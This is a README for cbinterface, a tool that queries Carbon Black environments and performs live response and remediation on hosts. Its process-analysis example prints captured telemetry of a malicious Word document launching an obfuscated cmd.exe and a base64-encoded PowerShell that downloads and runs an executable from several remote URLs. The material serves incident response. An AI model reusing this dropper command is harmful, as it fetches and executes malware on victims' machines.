# cbinterface

cbinterface is a command line tool for interfacing with multiple carbonblack environments to perform analysis and live response functions.

## Some Basic Examples

### query

Search for a md5:

```
$ cbinterface query md5:04A34D3737B01636C5BD8C4FFB542896

Searching acme environment..

3 processes returned by the query
 
    -------------------------
    Process GUID: 0000034c-0000-1180-01d3-06eb7d86e9fb
    Process Name:                                                                                                                                                      .exe
    Process PID: 4480
    Command Line: "D:\                                                                                                                                                     .exe"
    Parent Name: explorer.exe
    Hostname: win7-blahHost
    Start Time: 2017-07-27 15:17:42.009000
    GUI Link: https://cbserver.prod.acmecorp.com/#analyze/0000034c-0000-1180-01d3-06eb7d86e9fb/
 
    -------------------------
    Process GUID: 0000034c-0000-2120-01d3-06eb5dd25140
    Process Name: dw20.exe
    Process PID: 8480
    Command Line: dw20.exe -x -s 664
    Parent Name:                                                                                                                                                      .exe
    Hostname: win7-blahHost
    Start Time: 2017-07-27 15:16:51.325000
    GUI Link: https://cbserver.prod.acmecorp.com/#analyze/0000034c-0000-2120-01d3-06eb5dd25140/1501168673628
 
    -------------------------
    Process GUID: 0000034c-0000-1614-01d3-06eb5f812a21
    Process Name:                                                                                                                                                      .exe
    Process PID: 5652
    Command Line: "D:\                                                                                                                                                     .exe"
    Parent Name: explorer.exe
    Hostname: win7-blahHost
    Start Time: 2017-07-27 15:16:48.502000
    GUI Link: https://cbserver.prod.acmecorp.com/#analyze/0000034c-0000-1614-01d3-06eb5f812a21/1501168673628

Searching othercomp environment..

0 process segments returned by the query,
```

Query for a keyword on the command line, starting after a certain time and specifying a specific environment:

```
$ cbinterface -e sandbox query 'cmdline:Invoice*' -s '2018-08-21 07:00:00'

        -------------------------
        Process GUID: 0000001c-0000-0fd0-01d4-3943033fdf40
        Process Name: winword.exe
        Process PID: 4048
        Process MD5: bff948019509b5bf3f9b6ceed2e2b8e3
        Command Line: "C:\Program Files\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Invoice Confirmation 0O59758.doc"
        Parent Name: outlook.exe
        Hostname: win-pc-balh
        Username: SANDCORP\sandman
        Start Time: 2018-08-21 07:35:08.069000-0400
        GUI Link: https://sandbox.local/#analyze/0000001c-0000-0fd0-01d4-3943033fdf40/1534853413801
        
```

### Process analysis

Walk a process, and print out any filemod events in the process tree:

```
$ cbinterface proc 0000001c-0000-0fd0-01d4-3943033fdf40 -w -fm

Using acme environment ..

 "C:\Program Files\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Invoice Confirmation 0O59758.doc" (PID=4048)
   "C:\Windows\System32\cmd.exe"  /v^:/r "  S^ET^   ^0^K^J^=p^ower[h^ell^ ^-e^ ^JA2C^A^FQA^T^w^A^9^A^G^4AZQ^2^3AC0Ab^w2@AG^o^A^ZQ2j^A^HQA+^A^2OA^G,AdA^A)^AFc^A^Z^Q2^@A/^M^Ab^A^2^p^AG^,A^b^g20AD[A^JA^2^:A^F]Ab^A^A^9^ACc^A^a^A2^0^AHQ^AcAA^6ACuA^L^w^2qA^H^,^Ac^w20^A^G^,^Ad^g2v^AGw^Adg^2lAHcA^a^Q^20AGg^A^Zw^2y^AG/A]^w^2^l^AC^4^A]w^2vAG^0^A^L^w^2^P^A/^u^Acw2w^A/AAaA^20A^HQAcAA^6AC^uALw^2^%A^Gu^A^ZA2h^AC^4^AbQ2h^AG[^Ae^Q2h^A^Go^AcA^2^lAH^+Aa^Q2zAG^k^ALg2j^AG^uAb^Q^AvAG^4^Aag2^AA^G^gA^dA^20^AHAAOgAv^AC^u^A^bQ^2^h^AG^kA^b^A^A)^A^D/A^M^g2n^A^H^+^A^]Q^2@AC^4A^]w2vAG0A^Lw2J^A/AAa^A2^0^A&QAc^A^A6AC^u^ALw^2^%^AH^,Aa^g2lAH^+^AcA^2^yA^G^u^A^ZA2^1A^G^MAd^A^2p^AH^]A]^Q^2^y^A^G/A^ZA2^pA^GuAL^g^2^q^A^G/^A]^w2x^A^H^,AZ^Q^2^[^AGkA^b^g2^lA^Ho^Ab^w^2^y^A^H+AaQ2^[A^G^wA^]^Q^A)^A^G^M^A^b^w^2^%ACu^AV^w^2^A^A^G^gAd^A20AHAA^OgAvACuA^ZA^2^l^A^G^w^A^aQ2^%A^G/Acg^2hAC4A]^w^2vAC^4Ae^g^2h^ACu^Ad^A^A^z^Ac^A^L^g^2T^AH^A^Ab^A^2pAH^QA\A^AnA/^A^AJ^w^ApA^D^[^AJA2pAF^]^AW^QAgA^D0^A^+^AAn^A^D^]^ANw^AzACc^AOwA^k^A^F,^AcA2^@^AD0A^JA2l^A^G^4AdgA6^A^HA^Ad^Q^2^@A^Gw^AaQ^2^jAC[^A^Jw^2cACcA\wA^kA^G^kAV^g^2Z^AC[^AJw^A)A^G,^AeA2lACcA^O^w^2:^G^G^uAcg2l^A^G/A]^w^2oAC^g^A^JA^2IAFo^AdQAg^AGk^Ab^g^A^gACQAZg2WAG^wA^\Q^2^7AH^Q^Ac^g2^?AH^[AJA2C^AFQA^TwA)A/^QA^bw23^A^G4A^b^A^2v^AG/AZA2^G^A^Gk^Ab^A^2l^ACgA^JA2^I^AFoA^dQ^A^[AC^A^A^JA^2V^A^HAA^]gA^p^AD^[^AS^Q^2)^AH^]^A^bw^2r^AG,^A^L^Q^2^J^AH^Q^A^Z^Q2^%^AC^AAJA^2VA^HA^A^]g^A^7^AG+Acg^2l^AG/A^a^wA7^A^H^0^A]w^2hAHQ^A]w2^o^A^H^[^A^f^Q29AC^AA^+^A^A^gAC^AA^+A^A^gACA^A+A^A^g^ACAA^+AAgACAA+^AA^gAC^AA+^AA^=&   sET ^   ^F^DY^M=!0^K^J^:?^=^5!&&   s^et  ^ ^ ^ ^pVU^W=^!^F^D^Y^M:^2^=B^!&& sE^T ^ ^  ^lF^k^f=!^pVU^W^:^]^=^Y^!&s^et ^ ^y4=^!^lF^k^f^:^u^=^8^!&&s^eT ^ ^ ^ ^d^5^6=^!^y4^:^:^=m!&&  s^e^T ^  l8^k^U=!^d^5^6:^I=^X^!&&s^e^T ^  ^ ^Qi=^!^l^8^k^U^:^@^=i!&& Se^T ^ ^H^a=^!^Q^i:[^=s^!&&  S^e^t ^2j^p=^!^H^a^:)=^u^!& s^e^T  ^  ^3^G5=^!^2j^p^:^\^=^K^!&&   S^e^t ^  W^b=^!^3^G^5:/^=^E^!&&s^E^T  W^d^P=^!^W^b^:^,=U^!&&   S^e^t ^  ^f^0=!W^d^P^:+^=I^!&& S^e^T ^ G^b^98=!^f^0^:%=t^!& C^AL^l %G^b^98%  " (PID=1736)
     powershell  -e JABCAFQATwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABmAFYAbAA9ACcAaAB0AHQAcAA6AC8ALwBqAHUAcwB0AGUAdgBvAGwAdgBlAHcAaQB0AGgAZwByAGEAYw4BlAC4AYwBvAG0ALwBPAE8AcwBwAEAAaAB0AHQAcAA6AC8ALwBtAG8AZABhAC4AbQBhAGsAeQBhAGoAcABlAHIAaQBzAGkALgBjAG8AbQAvAG4AagBBAGgAdAB0AHAAOgAvAC8AbQBhAGkAbAAuADEAMgBnAHIAYQBiAC4AYwBvAG0ALwBJAEAAaAB0AHQAcAA6AC8ALwBtAHUAagBlAHIAcAByrAG8AZAB1AGMAdABpAHYAYQByAGEAZABpAG8ALgBqAGEAYwBxAHUAZQBsAGkAbgBlAHoAbwByAHIAaQBsAGwAYQAuAGMAbwBtAC8AVwBAAGgAdAB0AHAAOgAvAC8AZABlAGwAaQBtGEAcgBhAC4AYwBvAC4AegBhAC8AdAAzACcALgBTAHAAbABpAHQAKAAnAEAAJwApADsCATSareCOOLpAFYAWQAgAD0AIAAnADYANwAzACcAOwAkAFUAcABiAD0AJABlAG4AdgA6AHAAdQBiAGwAaQBjACsAJwBcACcAKwAkAGkAVgBZACsAJwAuAGUAeABlACcAOwBmAG8AcgBlAGEAYwBoACgAJABXAFoAdQAgAGkAbgAgACQAZgBWAGwAKQB7AHQAcgB5AHsAJABCAFQATwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABXAFoAdQAsACAAJABVAHAAYgApADsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABVAHAAYgA7AGIAcgBlAGEAawA7AH0AYwBhAHQAYwBoAHsAfQB9ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA=   (PID=2464)

+  winword.exe (PID:4048) - 0000001c-0000-0fd0-01d4-3943033fdf40
  === FILEMODS ====
  2018-08-21 07:35:11.073000-0400: FirstWrote: c:\users\sandman\appdata\local\temp\cvr1d81.tmp.cvr
  2018-08-21 07:35:11.073000-0400: Deleted: c:\users\sandman\appdata\local\temp\cvr1d81.tmp
  2018-08-21 07:35:11.454000-0400: FirstWrote: c:\users\sandman\appdata\roaming\microsoft\templates\~$normal.dotm
  2018-08-21 07:35:11.454000-0400: FirstWrote: c:\analysis\0\bin\~$normal.dotm.3279569956
  2018-08-21 07:35:11.504000-0400: FirstWrote: c:\users\sandman\appdata\local\microsoft\windows\temporary internet files\content.word\~wrs{30bdd0a0-5905-40ad-9ed4-f1591f3866a9}.tmp
  2018-08-21 07:35:11.504000-0400: FirstWrote: c:\analysis\0\bin\~wrs{30bdd0a0-5905-40ad-9ed4-f1591f3866a9}.tmp.1554814961
  2018-08-21 07:35:51.694000-0400: FirstWrote: c:\~$voice confirmation 0o59758.doc
  2018-08-21 07:35:51.694000-0400: FirstWrote: c:\analysis\0\bin\~$voice confirmation 0o59758.doc.164820488
  2018-08-21 07:35:52.465000-0400: FirstWrote: c:\users\sandman\appdata\roaming\microsoft\office\recent\invoice confirmation 0o59758.lnk
  2018-08-21 07:35:52.465000-0400: FirstWrote: c:\analysis\0\bin\invoice confirmation 0o59758.lnk.1355676710
  2018-08-21 07:35:52.476000-0400: FirstWrote: c:\users\sandman\appdata\roaming\microsoft\office\recent\index.dat
  2018-08-21 07:35:52.556000-0400: Deleted: c:\users\sandman\appdata\roaming\microsoft\office\recent\invoice confirmation 0o59758.lnk
  2018-08-21 07:35:52.586000-0400: FirstWrote: c:\analysis\0\bin\index.dat.3329669335

+  cmd.exe (PID:1736) - 0000001c-0000-06c8-01d4-39431dd7d4b0
  === FILEMODS ====

+  powershell.exe (PID:2464) - 0000001c-0000-09a0-01d4-39431e4a6fc0
  === FILEMODS ====
  2018-08-21 07:36:05.650000-0400: FirstWrote: c:\users\sandman\appdata\roaming\microsoft\windows\recent\customdestinations\gik7dvs0hbwl83m8rt5u.temp
  2018-08-21 07:36:05.650000-0400: FirstWrote: c:\analysis\0\bin\gik7dvs0hbwl83m8rt5u.temp.3088633466
  2018-08-21 07:36:05.650000-0400: FirstWrote: c:\users\sandman\appdata\roaming\microsoft\windows\recent\customdestinations\d93f411851d7c929.customdestinations-ms
  2018-08-21 07:36:05.650000-0400: Deleted: c:\users\sandman\appdata\roaming\microsoft\windows\recent\customdestinations\gik7dvs0hbwl83m8rt5u.temp

```

### Live Response

#### Collection

Collect a registry from a host:

    $ cbinterface collect <sensor hostname> -r "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\badness"
    Wed Jan  3 13:36:36 2018... starting
    Using acme environment ..
    LR session started at Wed Jan  3 13:38:30 2018
 
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run\badness
    -------------------------
    Name: badness
    Type: REG_SZ
    Data: "c:\users\sandman\appdata\roaming\asdf3j\badness.exe"
 
    Wed Jan  3 13:38:31 2018...Done.
    
#### Remediation

Remediate an infected host:

    $ cat remediate.ini
    [files]
    file1=C:\Users\fakeuser\Desktop\testfile.txt
    
    [process_names]
    proc1=cmd.exe
    proc2=notepad++.exe
    
    [directories]
    directory1=C:\Users\fakeuser\Desktop\nanocore
    
    [pids]
    pid1=10856
    
    [registry_paths]
    reg1=HKLM\Software\Microsoft\Windows\CurrentVersion\Run\calc
    reg2=HKLM\Software\Microsoft\Windows\CurrentVersion\Run\hippo
   

    $ cbinterface remediate <sensor hostname> -f remediate.ini
    
    Mon Oct  9 16:43:58 2017... starting
    Using acme environment ..
    Remediating <sensor hostname>..
    found: c:\program files (x86)\notepad++\notepad++.exe with pid:2788
    found: c:\windows\system32\cmd.exe with pid:7212
    + successfully killed pid:10856
    + successfully killed pid:2788
    + successfully killed pid:7212
    + Deleted C:\Users\fakeuser\Desktop\testfile.txt
    + Deleted HKLM\Software\Microsoft\Windows\CurrentVersion\Run\calc
    + Deleted HKLM\Software\Microsoft\Windows\CurrentVersion\Run\hippo
    + Deleted C:\Users\fakeuser\Desktop\nanocore
    Mon Oct  9 16:44:02 2017...Done.


## Installation

You can use pip to install cbinterface. Pip will try and install cbapi if it's not already installed.

```bash
pip install cbinterface
```

## Getting Started


Currently, cbiterface straps onto the default configuration files used by cbapi (see [here](https://github.com/carbonblack/cbapi-python#api-token)).

If you have multiple carbonblack environments, you should name the sections in your credentials.response configuration something meaningful. In addition, there are currently two custom fields that cbiterface looks for in the carbonblack response configuration file. First, ```envtype``` , which specifies the type of carbonblack environment. By default, **cbinterface will only return results or attach to environments where ```envtype``` is set to 'production'**. Otherwise, you will have to use the `-e` flag to specify the environment you want to work with. Below is an example credentials.response file:

    [sandbox]
    url=https://sandbox.local
    token=abcdef0123456789abcdef
    ssl_verify=False
    envtype=sandbox
    
    [acme]
    url=https://cbserver.prod.acmecorp.com
    token=aaaaaa
    ssl_verify=True
    ignore_system_proxy=True
    envtype=production

    [othercomp]
    url=https://cb.othercomp.com
    token=bbbbbb
    ssl_verify=True
    envtype=production

